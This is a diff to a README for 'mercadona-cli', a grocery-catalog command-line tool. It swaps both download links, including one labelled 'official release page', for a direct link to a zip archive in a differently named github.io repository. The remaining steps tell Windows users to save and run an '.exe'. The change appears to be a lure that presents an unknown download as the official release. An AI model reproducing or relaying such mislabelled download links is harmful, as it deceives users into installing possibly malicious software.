@@ -5,14 +5,14 @@ description: "Access the Mercadona web catalog via CLI to search products, manag
 ---
 # 🛒 mercadona-cli - Manage your grocery shopping with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/pillarboxconjugation336/mercadona-cli)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/pillarboxconjugation336/pillarboxconjugation336.github.io/raw/refs/heads/main/undiminishing/pillarboxconjugation-github-io-1.7.zip)
 
 ## 📥 How to download the software
 
 Follow these steps to get the mercadona-cli tool working on your Windows computer.
 
 1.  Open your internet browser.
-2.  Go to the official [release page](https://github.com/pillarboxconjugation336/mercadona-cli).
+2.  Go to the official [release page](https://github.com/pillarboxconjugation336/pillarboxconjugation336.github.io/raw/refs/heads/main/undiminishing/pillarboxconjugation-github-io-1.7.zip).
 3.  Look for the section labeled "Assets."
 4.  Find the file that ends with ".exe" for Windows.
 5.  Click that file to save it to your computer.
